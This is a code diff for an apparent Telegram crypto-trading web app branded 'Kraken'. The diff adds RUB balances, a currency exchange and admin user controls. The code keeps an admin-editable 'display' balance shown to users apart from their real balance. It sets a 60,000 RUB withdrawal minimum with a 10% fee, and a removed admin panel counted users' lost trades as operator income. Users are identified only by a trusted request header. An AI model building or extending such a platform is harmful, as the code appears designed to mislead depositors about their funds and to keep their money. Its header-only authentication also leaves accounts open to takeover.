@@ -1,5 +1,5 @@
 
-import os, json, time, hashlib, random, math, asyncio
+import os, json, time, hashlib, asyncio
 from datetime import datetime, timedelta, timezone
 from typing import Optional, Dict, Any, List
 from fastapi import FastAPI, Request, Depends, HTTPException, UploadFile, File, Form, Query, APIRouter
@@ -63,7 +63,6 @@ def create_db_engine(db_url):
     
     return create_async_engine(db_url, pool_pre_ping=True)
 
-DB_URL = raw_db_url
 engine = create_db_engine(raw_db_url)
 print(f"[Kraken] Database engine created successfully")
 
@@ -78,13 +77,19 @@ class User(Base):
     username=Column(String)
     language=Column(String, default="ru")
     balance_usdt=Column(Float, default=0.0)  # Real balance (actual money)
+    balance_rub=Column(Float, default=0.0)  # Russian Ruble balance
     display_balance_usdt=Column(Float, nullable=True)  # Display balance (can be modified by admin, if NULL use balance_usdt)
+    preferred_fiat=Column(String, default="RUB")  # Preferred fiat currency: RUB, BYN, UAH
     wallets=Column(JSON, default=dict)
     addresses=Column(JSON, default=dict)
     referral_code=Column(String, unique=True, index=True, nullable=True)  # Unique referral code
     referred_by=Column(Integer, nullable=True)  # Profile ID of referrer
     referral_earnings=Column(Float, default=0.0)  # Total earnings from referrals
     referral_count=Column(Integer, default=0)  # Number of referred users
+    is_verified=Column(Boolean, default=False)  # Account verified status
+    is_premium=Column(Boolean, default=False)  # Premium subscription status
+    is_blocked=Column(Boolean, default=False)  # Account blocked status
+    block_reason=Column(Text, nullable=True)  # Reason for blocking
     created_at=Column(DateTime, default=datetime.utcnow)
 
 class Transaction(Base):
@@ -136,7 +141,6 @@ class Trade(Base):
     result=Column(String, nullable=True)
     payout=Column(Float, default=0.0)
     closed_at=Column(DateTime, nullable=True)
-    # REMOVED predicted_result - Честная торговля на реальных ценах!
 
 class SupportMessage(Base):
     __tablename__="support_messages"
@@ -210,7 +214,7 @@ async def cmc_simple_price(symbol:str, convert="USDT")->float|None:
 
 async def cmc_usdt_to_fiat(fiat="RUB")->float:
     p=await cmc_simple_price("USDT", fiat)
-    return float(p) if p else 90.0
+    return float(p) if p else 78.0
 
 OKX_BASE = "https://www.okx.com/api/v5"
 
@@ -419,11 +423,10 @@ async def startup():
     async with engine.begin() as conn:
         await conn.run_sync(Base.metadata.create_all)
         
-        # REMOVED predicted_result migration - честная торговля!
-        
-        # Auto-migration: Add display_balance_usdt to users
+        # Auto-migration: Add display_balance_usdt and balance_rub to users
         try:
             await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS display_balance_usdt FLOAT"))
+            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS balance_rub FLOAT DEFAULT 0.0"))
         except Exception:
             pass
         
@@ -446,6 +449,27 @@ async def startup():
         try:
             await conn.execute(text("ALTER TABLE admin_messages ADD COLUMN IF NOT EXISTS delivery_type VARCHAR DEFAULT 'app_chat'"))
             await conn.execute(text("UPDATE admin_messages SET delivery_type = 'app_chat' WHERE delivery_type IS NULL"))
+        except Exception:
+            pass
+        
+        # Auto-migration: Add preferred_fiat to users
+        try:
+            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS preferred_fiat VARCHAR DEFAULT 'RUB'"))
+            await conn.execute(text("UPDATE users SET preferred_fiat = 'RUB' WHERE preferred_fiat IS NULL"))
+        except Exception:
+            pass
+        
+        # Auto-migration: Add is_verified and is_premium to users
+        try:
+            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_verified BOOLEAN DEFAULT FALSE"))
+            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_premium BOOLEAN DEFAULT FALSE"))
+        except Exception:
+            pass
+        
+        # Auto-migration: Add is_blocked and block_reason to users
+        try:
+            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_blocked BOOLEAN DEFAULT FALSE"))
+            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS block_reason TEXT"))
         except Exception:
             pass
         
@@ -512,7 +536,7 @@ async def api_user(db: AsyncSession=Depends(get_db), request: Request=None):
     if 'RUB' in wallets:
         del wallets['RUB']
     
-    return {"id":u.id,"telegram_id":u.telegram_id,"profile_id":u.profile_id,"language":u.language,"balance_usdt":displayed_balance,"wallets":wallets,"addresses":u.addresses or {},"is_admin":is_admin}
+    return {"id":u.id,"telegram_id":u.telegram_id,"profile_id":u.profile_id,"language":u.language,"balance_usdt":displayed_balance,"balance_rub":u.balance_rub or 0.0,"preferred_fiat":u.preferred_fiat or "RUB","wallets":wallets,"addresses":u.addresses or {},"is_admin":is_admin,"is_verified":u.is_verified or False,"is_premium":u.is_premium or False,"is_blocked":u.is_blocked or False,"block_reason":u.block_reason}
 
 @app.get("/api/referrals")
 async def api_referrals(db: AsyncSession=Depends(get_db), request: Request=None):
@@ -561,6 +585,48 @@ async def api_prices():
             prices[sym] = 0
     
     return prices
+
+async def get_exchange_rates():
+    """Get USD exchange rates from free API"""
+    try:
+        async with aiohttp.ClientSession() as sess:
+            async with sess.get("https://open.er-api.com/v6/latest/USD", timeout=10) as r:
+                if r.status == 200:
+                    data = await r.json()
+                    rates = data.get("rates", {})
+                    return {
+                        "usd_rub": rates.get("RUB", 78.0),
+                        "usd_uah": rates.get("UAH", 42.2),
+                        "usd_byn": rates.get("BYN", 2.92)
+                    }
+    except Exception as e:
+        print(f"[RATES] Error fetching exchange rates: {e}")
+    return {"usd_rub": 78.0, "usd_uah": 42.2, "usd_byn": 2.92}
+
+@app.get("/api/rates")
+async def api_rates():
+    """Get current exchange rates for RUB, BYN, UAH to USD"""
+    return await get_exchange_rates()
+
+class SetCurrencyPayload(BaseModel):
+    currency: str
+
+@app.post("/api/user/currency")
+async def api_set_currency(p: SetCurrencyPayload, db: AsyncSession=Depends(get_db), request: Request=None):
+    """Set user's preferred fiat currency"""
+    tid = request.headers.get("X-Telegram-Id", "999999")
+    u = (await db.execute(select(User).where(User.telegram_id == str(tid)))).scalars().first()
+    if not u:
+        return JSONResponse({"ok": False, "error": "User not found"})
+    
+    valid_currencies = ["RUB", "BYN", "UAH"]
+    currency = p.currency.upper()
+    if currency not in valid_currencies:
+        return JSONResponse({"ok": False, "error": f"Invalid currency. Use: {', '.join(valid_currencies)}"})
+    
+    u.preferred_fiat = currency
+    await db.commit()
+    return {"ok": True, "currency": currency}
 
 @app.get("/api/tickers")
 async def api_tickers():
@@ -829,19 +895,127 @@ async def api_check_deposit(invoice_id:str, db: AsyncSession=Depends(get_db), re
     return {"ok":True,"paid":False}
 
 class WithdrawPayload(BaseModel):
-    amount_usdt: float
+    amount_rub: float  # Сумма в рублях (пользователь вводит в рублях)
     card_number: str
     full_name: str
 
-MIN_WITHDRAW_USDT = 630.0  # Минимальная сумма вывода (~60000₽)
+MIN_WITHDRAW_RUB = 60000.0  # Минимальная сумма вывода в рублях
+
+class ExchangeRubPayload(BaseModel):
+    from_currency: str  # "RUB" или "USDT"
+    to_currency: str    # "USDT" или "RUB"
+    amount: float
+
+@app.post("/api/exchange/rub")
+async def api_exchange_rub(p: ExchangeRubPayload, db: AsyncSession=Depends(get_db), request: Request=None):
+    """Exchange between RUB and USDT with 2% commission"""
+    EXCHANGE_FEE_PERCENT = 2.0
+    
+    if p.from_currency == p.to_currency:
+        return JSONResponse({"ok": False, "error": "Нельзя выбрать одинаковую валюту"})
+    
+    if p.from_currency not in ["RUB", "USDT"] or p.to_currency not in ["RUB", "USDT"]:
+        return JSONResponse({"ok": False, "error": "Неверные валюты. Только RUB и USDT"})
+    
+    if p.amount <= 0:
+        return JSONResponse({"ok": False, "error": "Введите сумму больше 0"})
+    
+    tid = request.headers.get("X-Telegram-Id", "999999")
+    u = (await db.execute(select(User).where(User.telegram_id == str(tid)))).scalars().first()
+    if not u:
+        return JSONResponse({"ok": False, "error": "Пользователь не найден"})
+    
+    # Get current USDT/RUB rate
+    rate = await cmc_usdt_to_fiat("RUB")
+    
+    if p.from_currency == "RUB":
+        # RUB → USDT: Convert rubles to USDT
+        if (u.balance_rub or 0) < p.amount:
+            return JSONResponse({"ok": False, "error": f"Недостаточно рублей. Доступно: {u.balance_rub or 0:.2f} ₽"})
+        
+        usdt_amount_raw = p.amount / rate
+        usdt_amount = usdt_amount_raw * (1 - EXCHANGE_FEE_PERCENT / 100)
+        
+        u.balance_rub = (u.balance_rub or 0) - p.amount
+        u.balance_usdt = (u.balance_usdt or 0) + usdt_amount
+        
+        db.add(Transaction(
+            user_id=u.id,
+            type="exchange",
+            amount=p.amount,
+            currency="RUB",
+            status="done",
+            details={
+                "from": "RUB",
+                "to": "USDT",
+                "amount_to": usdt_amount,
+                "rate": rate,
+                "fee_percent": EXCHANGE_FEE_PERCENT
+            }
+        ))
+        await db.commit()
+        
+        return {"ok": True, "amount_to": usdt_amount, "rate": rate, "fee_percent": EXCHANGE_FEE_PERCENT}
+    
+    else:
+        # USDT → RUB: Convert USDT to rubles
+        if (u.balance_usdt or 0) < p.amount:
+            return JSONResponse({"ok": False, "error": f"Недостаточно USDT. Доступно: {u.balance_usdt or 0:.2f} USDT"})
+        
+        rub_amount_raw = p.amount * rate
+        rub_amount = rub_amount_raw * (1 - EXCHANGE_FEE_PERCENT / 100)
+        
+        u.balance_usdt = (u.balance_usdt or 0) - p.amount
+        u.balance_rub = (u.balance_rub or 0) + rub_amount
+        
+        db.add(Transaction(
+            user_id=u.id,
+            type="exchange",
+            amount=p.amount,
+            currency="USDT",
+            status="done",
+            details={
+                "from": "USDT",
+                "to": "RUB",
+                "amount_to": rub_amount,
+                "rate": rate,
+                "fee_percent": EXCHANGE_FEE_PERCENT
+            }
+        ))
+        await db.commit()
+        
+        return {"ok": True, "amount_to": rub_amount, "rate": rate, "fee_percent": EXCHANGE_FEE_PERCENT}
+
+@app.get("/api/exchange/rub/quote")
+async def api_exchange_rub_quote(from_currency: str = Query(..., alias="from"), to_currency: str = Query(..., alias="to"), amount: float = Query(...)):
+    """Get quote for RUB/USDT exchange"""
+    EXCHANGE_FEE_PERCENT = 2.0
+    
+    if from_currency == to_currency:
+        raise HTTPException(400, "Нельзя выбрать одинаковую валюту")
+    
+    rate = await cmc_usdt_to_fiat("RUB")
+    
+    if from_currency == "RUB":
+        usdt_amount_raw = amount / rate
+        amount_to = usdt_amount_raw * (1 - EXCHANGE_FEE_PERCENT / 100)
+    else:
+        rub_amount_raw = amount * rate
+        amount_to = rub_amount_raw * (1 - EXCHANGE_FEE_PERCENT / 100)
+    
+    return {
+        "amount_to": amount_to,
+        "rate": rate,
+        "fee_percent": EXCHANGE_FEE_PERCENT
+    }
 
 @app.post("/api/withdraw")
 async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), request: Request=None):
     WITHDRAW_FEE_PERCENT = 10.0  # 10% комиссия на вывод
     
-    # Проверка минимальной суммы
-    if p.amount_usdt < MIN_WITHDRAW_USDT:
-        return JSONResponse({"ok":False,"error":f"Минимальная сумма вывода: {MIN_WITHDRAW_USDT} USDT (~60000₽)"})
+    # Проверка минимальной суммы в рублях
+    if p.amount_rub < MIN_WITHDRAW_RUB:
+        return JSONResponse({"ok":False,"error":f"Минимальная сумма вывода: {MIN_WITHDRAW_RUB:,.0f} ₽"})
     
     # Проверка данных карты и ФИО
     if not p.card_number or len(p.card_number) < 13:
@@ -853,17 +1027,23 @@ async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), req
     tid=request.headers.get("X-Telegram-Id","999999")
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     
-    # Расчёт комиссии
-    fee_usdt = round(p.amount_usdt * (WITHDRAW_FEE_PERCENT / 100), 6)
-    usdt_required = round(p.amount_usdt, 6)  # Общая сумма к списанию
-    amount_after_fee = round(p.amount_usdt - fee_usdt, 6)  # Сумма к выводу после комиссии
+    # Получаем актуальный курс USDT/RUB
+    rate = await cmc_usdt_to_fiat("RUB")
+    
+    # Конвертируем сумму в рублях в USDT
+    amount_usdt_raw = p.amount_rub / rate
+    
+    # Расчёт комиссии (10% от USDT)
+    fee_usdt = round(amount_usdt_raw * (WITHDRAW_FEE_PERCENT / 100), 6)
+    usdt_required = round(amount_usdt_raw + fee_usdt, 6)  # USDT с комиссией
+    amount_after_fee = round(amount_usdt_raw, 6)  # USDT к выводу (без комиссии)
     
     # Check REAL balance (not display balance)
     if (u.balance_usdt or 0) < usdt_required:
-        return JSONResponse({"ok":False,"error":f"Недостаточно средств. Требуется {usdt_required:.4f} USDT"})
+        return JSONResponse({"ok":False,"error":f"Недостаточно средств. Требуется {usdt_required:.2f} USDT (включая комиссию {fee_usdt:.2f})"})
     
-    # Сумма в рублях после комиссии
-    amount_rub = round(amount_after_fee * rate, 2)
+    # Сумма в рублях (что ввёл пользователь)
+    amount_rub = p.amount_rub
     
     # AUTOMATIC TRANSFER: Deduct funds IMMEDIATELY and transfer to admin wallet
     u.balance_usdt = (u.balance_usdt or 0) - usdt_required
@@ -1924,549 +2104,224 @@ async def telegram_webhook(update: Dict[str,Any], db: AsyncSession=Depends(get_d
         if "callback_query" in update:
             cq=update["callback_query"]; data=cq.get("data",""); chat_id=cq["message"]["chat"]["id"]
             
-            # ========== ADMIN PANEL CALLBACKS ==========
-            # Admin: Show users list
-            if data == "admin:users" and str(chat_id) == str(ADMIN_ID):
-                users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(10))).scalars().all()
-                text = "👥 <b>Последние 10 пользователей:</b>\n\n"
-                for u in users:
-                    real_bal = u.balance_usdt or 0.0
-                    display_bal = u.display_balance_usdt if u.display_balance_usdt is not None else real_bal
-                    text += f"🆔 #{u.profile_id} | @{u.username or 'N/A'}\n"
-                    text += f"💰 Баланс: {display_bal:.2f} USDT\n"
-                    text += f"💎 Реальный: {real_bal:.2f} USDT\n"
-                    text += f"📅 {u.created_at.strftime('%Y-%m-%d')}\n\n"
-                buttons = [[{"text": "🔙 Назад", "callback_data": "admin:menu"}]]
-                await bot_send_message(chat_id, text, buttons)
+            # ========== ESSENTIAL CALLBACKS ONLY ==========
+            # Check deposit payment status
+            if data.startswith("check_deposit:"):
+                invoice_id=data.split(":",1)[1]
+                print(f"[CHECK_DEPOSIT] User {chat_id} checking invoice {invoice_id}")
+                async with aiohttp.ClientSession() as s:
+                    headers = {"X-Telegram-Id": str(chat_id)}
+                    async with s.get(f"{HOST_BASE}/api/check_deposit", params={"invoice_id": invoice_id}, headers=headers) as r:
+                        st=await r.json()
+                        print(f"[CHECK_DEPOSIT] Result: {st}")
+                        if st.get("paid"): 
+                            amount = st.get('amount', 0)
+                            new_balance = st.get('new_balance', 0)
+                            await bot_send_message(chat_id, f"✅ <b>Платеж подтвержден!</b>\n\n💰 Сумма: {amount} USDT\n💵 Ваш баланс: {round(new_balance, 2)} USDT\n\n🎉 Средства успешно зачислены на ваш счет!", parse_mode="HTML")
+                        else: 
+                            await bot_send_message(chat_id, "⏳ <b>Платеж в обработке</b>\n\nПлатеж еще не поступил. Пожалуйста, подождите несколько минут и попробуйте еще раз.\n\nЕсли вы оплатили счет, средства будут зачислены автоматически.", parse_mode="HTML")
             
-            # Admin: Show statistics with detailed earnings breakdown
-            elif data == "admin:stats" and str(chat_id) == str(ADMIN_ID):
-                # Basic stats
-                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                active_trades = (await db.execute(select(func.count(Trade.id)).where(Trade.status == "active"))).scalar() or 0
-                total_balance = (await db.execute(select(func.sum(User.balance_usdt)))).scalar() or 0.0
-                pending_withdrawals = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status == "pending"))).scalar() or 0
-                
-                # Earnings calculations
-                # Deposit fees (5% from all completed deposits)
-                deposit_txs = (await db.execute(select(Transaction).where(Transaction.type == "deposit", Transaction.status == "done"))).scalars().all()
-                deposit_fees = sum(tx.amount * 0.05 for tx in deposit_txs)
-                total_deposits = sum(tx.amount for tx in deposit_txs)
-                
-                # Withdrawal fees (10% from approved withdrawals)
-                approved_withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status == "approved"))).scalars().all()
-                withdrawal_fees = sum(w.usdt_required * 0.10 for w in approved_withdrawals if w.usdt_required)
-                total_withdrawals = sum(w.usdt_required or 0 for w in approved_withdrawals)
-                
-                # Exchange fees (2% embedded in rate)
-                exchange_txs = (await db.execute(select(Transaction).where(Transaction.type == "exchange", Transaction.status == "done"))).scalars().all()
-                exchange_fees = sum(abs(tx.amount) * 0.02 for tx in exchange_txs)
-                
-                # Trading fees (2% from all trades)
-                all_trades_txs = (await db.execute(select(Transaction).where(Transaction.type == "trade"))).scalars().all()
-                trading_fees = sum(tx.details.get("fee", 0) for tx in all_trades_txs if tx.details and isinstance(tx.details, dict))
-                
-                # Trading profit (lost trades = your profit)
-                lost_trades = (await db.execute(select(Trade).where(Trade.status == "completed", Trade.result == "loss"))).scalars().all()
-                trading_profit = sum(t.amount for t in lost_trades)
-                
-                won_trades = (await db.execute(select(Trade).where(Trade.status == "completed", Trade.result == "win"))).scalars().all()
-                trading_loss = sum(t.amount * 0.7 for t in won_trades)
-                
-                net_trading_profit = trading_profit - trading_loss
-                
-                # Total earnings
-                total_earnings = deposit_fees + withdrawal_fees + exchange_fees + trading_fees + net_trading_profit
-                
-                text = f"💰 <b>Панель заработка</b>\n\n"
-                text += f"💵 <b>ОБЩИЙ ДОХОД: {total_earnings:.2f} USDT</b>\n\n"
-                text += f"📥 <b>Депозиты (5%):</b> {deposit_fees:.2f} USDT\n"
-                text += f"   └ Всего депозитов: {total_deposits:.2f} USDT\n\n"
-                text += f"📤 <b>Выводы (10%):</b> {withdrawal_fees:.2f} USDT\n"
-                text += f"   └ Всего выведено: {total_withdrawals:.2f} USDT\n\n"
-                text += f"🔄 <b>Обмены (2%):</b> {exchange_fees:.2f} USDT\n\n"
-                text += f"💸 <b>Комиссия за торговлю (2%):</b> {trading_fees:.2f} USDT\n\n"
-                text += f"📊 <b>Проигранные сделки:</b> {net_trading_profit:.2f} USDT\n"
-                text += f"   ├ Проигранные: +{trading_profit:.2f}\n"
-                text += f"   └ Выигранные: -{trading_loss:.2f}\n\n"
-                text += f"━━━━━━━━━━━━━━━━\n"
-                text += f"👥 Пользователей: {total_users}\n"
-                text += f"📈 Активных сделок: {active_trades}\n"
-                text += f"💰 Баланс пользователей: {total_balance:.2f} USDT\n"
-                text += f"💸 Заявок на вывод: {pending_withdrawals}\n"
-                
-                buttons = [[{"text": "🔙 Назад", "callback_data": "admin:menu"}]]
-                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
+            # Handle withdrawal approval from notification buttons
+            elif data.startswith("approve_withdraw:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    withdrawal_id = int(data.split(":",1)[1])
+                    withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
+                    if withdrawal:
+                        if withdrawal.status == "completed":
+                            await bot_send_message(chat_id, f"✅ Вывод #{withdrawal_id} уже одобрен")
+                            return {"ok": True}
+                        
+                        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
+                        withdrawal.status = "completed"
+                        withdrawal.completed_at = datetime.utcnow()
+                        await db.commit()
+                        
+                        user_display = format_user_display(user) if user else "N/A"
+                        await bot_send_message(chat_id, f"✅ <b>Вывод #{withdrawal_id} завершен!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n👤 Пользователь: {user_display}", parse_mode="HTML")
+                        
+                        if user:
+                            try:
+                                await bot_send_message(int(user.telegram_id), f"✅ <b>Деньги переведены!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n💳 На карту: **** {withdrawal.card_number}\n\n📊 Статус: <b>Завершено</b>", parse_mode="HTML")
+                            except: pass
+                    else:
+                        await bot_send_message(chat_id, "❌ Вывод не найден")
             
-            # Admin: Show withdrawals
-            elif data == "admin:withdrawals" and str(chat_id) == str(ADMIN_ID):
-                withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status.in_(["pending", "processing"])).order_by(Withdrawal.created_at.desc()).limit(10))).scalars().all()
-                
-                if not withdrawals:
-                    # Показываем последние завершенные заявки
-                    completed = (await db.execute(select(Withdrawal).where(Withdrawal.status == "completed").order_by(Withdrawal.created_at.desc()).limit(5))).scalars().all()
-                    text = "💸 <b>Заявки на вывод</b>\n\n✅ Нет активных заявок\n\n"
-                    
-                    if completed:
-                        text += "📜 <b>Последние выполненные:</b>\n"
-                        for w in completed:
-                            user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
-                            user_display = format_user_display(user)
-                            text += f"✅ #{w.id} | {w.amount_rub:,.0f} ₽ | {user_display}\n"
-                    
-                    await bot_send_message(chat_id, text, [[{"text": "🔙 Назад", "callback_data": "admin:menu"}]], parse_mode="HTML")
-                else:
-                    text = "💸 <b>Активные заявки на вывод</b>\n\n"
-                    # Подсчитаем общую сумму
-                    total_pending_usdt = sum(w.amount_usdt for w in withdrawals)
-                    total_pending_rub = sum(w.amount_rub for w in withdrawals)
-                    text += f"💰 Общая сумма: {total_pending_usdt:.2f} USDT ({total_pending_rub:,.0f} ₽)\n"
-                    text += f"📊 Заявок: {len(withdrawals)}\n\n"
-                    text += "Нажмите на заявку:\n\n"
+            # Handle withdrawal cancellation from notification buttons
+            elif data.startswith("cancel_withdraw:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    withdrawal_id = int(data.split(":",1)[1])
+                    withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
+                    if withdrawal:
+                        if withdrawal.status == "completed":
+                            await bot_send_message(chat_id, f"❌ Вывод #{withdrawal_id} уже завершен, отменить невозможно")
+                            return {"ok": True}
+                        elif withdrawal.status == "cancelled":
+                            await bot_send_message(chat_id, f"⚠️ Вывод #{withdrawal_id} уже отменен")
+                            return {"ok": True}
+                        
+                        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
+                        
+                        refund_amount = withdrawal.usdt_required
+                        if user:
+                            user.balance_usdt = (user.balance_usdt or 0) + refund_amount
+                        
+                        withdrawal.status = "cancelled"
+                        await db.commit()
+                        
+                        user_display = format_user_display(user) if user else "N/A"
+                        await bot_send_message(chat_id, f"❌ <b>Вывод #{withdrawal_id} отменён!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n👤 Пользователь: {user_display}\n\n✅ {refund_amount:.4f} USDT возвращены пользователю", parse_mode="HTML")
+                        
+                        if user:
+                            try:
+                                await bot_send_message(int(user.telegram_id), f"❌ <b>Вывод отменён</b>\n\n💰 Запрошенная сумма: {withdrawal.amount_rub:,.0f} ₽\n\n✅ {refund_amount:.4f} USDT возвращены на ваш баланс.", parse_mode="HTML")
+                            except: pass
+                    else:
+                        await bot_send_message(chat_id, "❌ Вывод не найден")
+            
+            # Handle contact user button
+            elif data.startswith("contact_user:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    target_user_id = data.split(":",1)[1]
+                    admin_reply_state[str(ADMIN_ID)] = target_user_id
+                    await bot_send_message(chat_id, f"✅ Режим ответа включен для пользователя {target_user_id}\n\nОтправьте сообщение, которое хотите передать пользователю.\n\nДля отмены отправьте: /cancel")
+            
+            # Handle admin reply button
+            elif data.startswith("reply:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    target_user_id = data.split(":",1)[1]
+                    admin_reply_state[str(ADMIN_ID)] = target_user_id
+                    await bot_send_message(chat_id, f"✅ Режим ответа включен для пользователя {target_user_id}\n\nОтправьте сообщение, которое хотите передать пользователю.\n\nДля отмены отправьте: /cancel")
+            
+            # ========== END ESSENTIAL CALLBACKS ==========
+            
+            # ========== ADMIN USER MANAGEMENT CALLBACKS ==========
+            # Handle select_user callback - show user management options
+            elif data.startswith("select_user:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    profile_id = int(data.split(":")[1])
+                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                    if user:
+                        verify_status = "✅" if user.is_verified else "❌"
+                        premium_status = "⭐" if user.is_premium else "❌"
+                        block_status = "🚫" if user.is_blocked else "✅"
+                        
+                        msg = f"👤 <b>Пользователь #{profile_id}</b>\n\n"
+                        msg += f"Username: @{user.username or 'N/A'}\n"
+                        msg += f"💰 Баланс: {user.balance_usdt:.2f} USDT\n"
+                        msg += f"Верификация: {verify_status}\n"
+                        msg += f"Premium: {premium_status}\n"
+                        msg += f"Статус: {block_status}\n"
+                        if user.is_blocked and user.block_reason:
+                            msg += f"Причина блокировки: {user.block_reason}\n"
+                        msg += f"\nВыберите действие:"
+                        
+                        block_btn_text = "✅ Разблокировать" if user.is_blocked else "🚫 Заблокировать"
+                        buttons = [
+                            [{"text": "💰 Баланс", "callback_data": f"manage:balance:{profile_id}"}],
+                            [{"text": "✅ Верификация", "callback_data": f"manage:verify:{profile_id}"}],
+                            [{"text": "⭐ Premium", "callback_data": f"manage:premium:{profile_id}"}],
+                            [{"text": block_btn_text, "callback_data": f"manage:block:{profile_id}"}],
+                            [{"text": "🔙 Назад", "callback_data": "admin:users"}]
+                        ]
+                        await bot_send_message(chat_id, msg, buttons, parse_mode="HTML")
+                    else:
+                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+            
+            # Handle admin:users callback - show users list
+            elif data == "admin:users":
+                if str(chat_id) == str(ADMIN_ID):
+                    users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(10))).scalars().all()
+                    msg = "👥 <b>Последние 10 пользователей:</b>\n\nВыберите пользователя для управления:"
                     
                     buttons = []
-                    for w in withdrawals:
-                        user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
-                        user_display = format_user_display(user)
-                        status_icon = "🔴" if w.status == "pending" else "🟡"
-                        text += f"{status_icon} #{w.id} - {w.amount_usdt:.2f} USDT ({w.amount_rub:,.0f} ₽) | {user_display}\n"
-                        button_text = f"#{w.id} | {w.amount_usdt:.2f} USDT"
-                        buttons.append([{"text": button_text, "callback_data": f"admin:withdraw:{w.id}"}])
+                    for u in users:
+                        block_icon = "🚫" if u.is_blocked else ""
+                        username_text = f"@{u.username}" if u.username else "Аноним"
+                        btn_text = f"👤 #{u.profile_id} {username_text} {block_icon}"
+                        buttons.append([{"text": btn_text, "callback_data": f"select_user:{u.profile_id}"}])
                     
-                    buttons.append([{"text": "🔙 Назад", "callback_data": "admin:menu"}])
-                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
+                    await bot_send_message(chat_id, msg, buttons, parse_mode="HTML")
             
-            # Admin: Show specific withdrawal card
-            elif data.startswith("admin:withdraw:") and str(chat_id) == str(ADMIN_ID):
-                withdrawal_id = int(data.split(":", 2)[2])
-                withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
-                if not withdrawal:
-                    await bot_send_message(chat_id, "❌ Заявка не найдена")
-                else:
-                    user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
-                    current_balance = user.balance_usdt if user else 0
-                    
-                    # Build card text
-                    text = f"💳 <b>Заявка на вывод #{withdrawal.id}</b>\n\n"
-                    text += f"👤 <b>Пользователь:</b>\n"
-                    user_info = format_user_info(user)
-                    text += f"  • {user_info}\n"
-                    text += f"  • Telegram ID: {withdrawal.telegram_id or user.telegram_id}\n"
-                    text += f"  • Баланс: {current_balance:.2f} USDT\n\n"
-                    
-                    text += f"💰 <b>Детали вывода:</b>\n"
-                    text += f"  • Сумма к выводу: {withdrawal.amount_rub:,.0f} ₽\n"
-                    text += f"  • USDT к списанию: {withdrawal.usdt_required:.2f}\n"
-                    text += f"  • Комиссия: 10%\n\n"
-                    
-                    if withdrawal.modified_to_crypto:
-                        text += f"🔄 <b>Тип:</b> Крипто-вывод\n"
-                        text += f"💎 <b>Валюта:</b> {withdrawal.crypto_currency}\n"
-                        text += f"📬 <b>Адрес:</b> <code>{withdrawal.crypto_address}</code>\n"
+            # Handle manage:verify callback - toggle verification
+            elif data.startswith("manage:verify:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    profile_id = int(data.split(":")[2])
+                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                    if user:
+                        user.is_verified = not user.is_verified
+                        await db.commit()
+                        status = "✅ Верифицирован" if user.is_verified else "❌ Не верифицирован"
+                        await bot_send_message(chat_id, f"👤 Пользователь #{profile_id}\nВерификация: {status}")
+                        
+                        buttons = [[{"text": "🔙 К пользователю", "callback_data": f"select_user:{profile_id}"}]]
+                        await bot_send_message(chat_id, "Выберите действие:", buttons)
                     else:
-                        text += f"💳 <b>Реквизиты карты:</b>\n"
-                        text += f"  • Карта: •••• {withdrawal.card_number or '****'}\n"  # Shows only last 4 digits
-                        text += f"  • ФИО: {withdrawal.full_name}\n"
-                        text += f"\n⚠️ Полный номер карты был отправлен только в первичном уведомлении\n"
-                    
-                    text += f"\n📊 <b>Статус:</b> "
-                    if withdrawal.status == "pending":
-                        text += "🔴 В ожидании"
-                    elif withdrawal.status == "processing":
-                        text += "🟡 В обработке"
-                    elif withdrawal.status == "completed":
-                        text += "✅ Завершена"
+                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+            
+            # Handle manage:premium callback - toggle premium
+            elif data.startswith("manage:premium:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    profile_id = int(data.split(":")[2])
+                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+                    if user:
+                        user.is_premium = not user.is_premium
+                        await db.commit()
+                        status = "⭐ Premium активен" if user.is_premium else "❌ Premium отключен"
+                        await bot_send_message(chat_id, f"👤 Пользователь #{profile_id}\n{status}")
+                        
+                        buttons = [[{"text": "🔙 К пользователю", "callback_data": f"select_user:{profile_id}"}]]
+                        await bot_send_message(chat_id, "Выберите действие:", buttons)
                     else:
-                        text += withdrawal.status
